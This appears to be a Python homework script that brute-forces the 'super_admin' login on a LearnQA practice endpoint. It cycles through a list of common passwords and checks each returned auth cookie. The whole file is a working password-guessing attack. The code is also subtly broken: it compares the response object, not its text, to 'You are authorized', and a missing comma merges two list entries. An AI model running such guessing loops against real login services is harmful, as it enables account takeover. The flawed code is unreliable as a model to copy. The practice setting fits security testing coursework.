import requests

login = "super_admin"
password = ""


pass_from_wiki = [
    "password", "123456", "12345678", "qwerty" "abc123", "monkey", "1234567",
    "letmein", "trustno1", "dragon", "baseball", "111111", "iloveyou", "master",
    "sunshine", "ashley", "bailey", "passw0rd", "shadow", "123123", "654321",
    "superman", "qazwsx", "michael", "Football", "password",	"123456",	"123456",	"123456",	"123456",	"123456",	"123456",	"123456",
    "123456",	"password",	"password",	"password",	"password",	"password",	"password",	"123456789",
    "12345678",	"12345678",	"12345",	"12345678",	"12345",	"12345678",	"123456789",	"qwerty",
    "abc123",	"qwerty",	"12345678",	"qwerty",	"12345678",	"qwerty",	"12345678",	"password",
    "qwerty",	"abc123",	"qwerty",	"12345",	"football",	"12345",	"12345",	"1234567",
    "monkey",	"123456789",	"123456789",	"123456789",	"qwerty",	"123456789",	"111111",	"12345678",
    "letmein",	"111111",	"1234",	"football",	"1234567890",	"letmein",	"1234567",	"12345",
    "dragon",	"1234567",	"baseball",	"1234",	"1234567",	"1234567",	"sunshine",	"iloveyou",
    "111111",	"iloveyou",	"dragon",	"1234567",	"princess",	"football",	"qwerty",	"111111",
    "baseball",	"adobe123[a]",	"football",	"baseball",	"1234",	"iloveyou",	"iloveyou",	"123123",
    "iloveyou",	"123123",	"1234567",	"welcome",	"login",	"admin",	"princess",	"abc123",
    "trustno1",	"admin",	"monkey",	"1234567890",	"welcome",	"welcome",	"admin",	"qwerty123",
    "1234567",	"1234567890",	"letmein",	"abc123",	"solo",	"monkey",	"welcome",	"1q2w3e4r",
    "sunshine",	"letmein",	"abc123",	"111111",	"abc123",	"login",	"666666",	"admin",
    "master",	"photoshop[a]",	"111111",	"1qaz2wsx",	"admin",	"abc123",	"abc123",	"qwertyuiop",
    "123123",	"1234",	"mustang",	"dragon",	"121212",	"starwars",	"football",	"654321",
    "welcome",	"monkey",	"access",	"master",	"flower",	"123123",	"123123",	"555555",
    "shadow",	"shadow",	"shadow",	"monkey",	"passw0rd",	"dragon",	"monkey",	"lovely",
    "ashley",	"sunshine",	"master",	"letmein",	"dragon",	"passw0rd",	"654321",	"7777777",
    "football",	"12345",	"michael",	"login",	"sunshine",	"master",	"!@#$%^&*",	"welcome",
    "jesus",	"password1",	"superman",	"princess",	"master",	"hello",	"charlie",	"888888",
    "michael",	"princess",	"696969",	"qwertyuiop",	"hottie",	"freedom",	"aa123456",	"princess",
    "ninja",	"azerty",	"123123",	"solo",	"loveme",	"whatever",	"donald",	"dragon",
    "mustang",	"trustno1",	"batman",	"passw0rd",	"zaq1zaq1",	"qazwsx",	"password1",	"password1",
    "password1",	"0",	"trustno1",	"starwars",	"password1",	"trustno1",	"qwerty123",	"123qwe"
]

for i in pass_from_wiki:
    password = i
    get_cookies_response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework",
                                         data={"login": login, "password": password})
    cookie_value = get_cookies_response.cookies.get('auth_cookie')
    cookie = {'auth_cookie': cookie_value}
    print(f"Cookie = {cookie}")
    check_cookie = requests.get("https://playground.learnqa.ru/ajax/api/check_auth_cookie",
                                cookies = cookie)
    if check_cookie != "You are authorized":
        print(check_cookie.text)
        print(f"Password {password} is not valid.")
        continue
    else:
        print(f"Password {password} is valid.")
        break

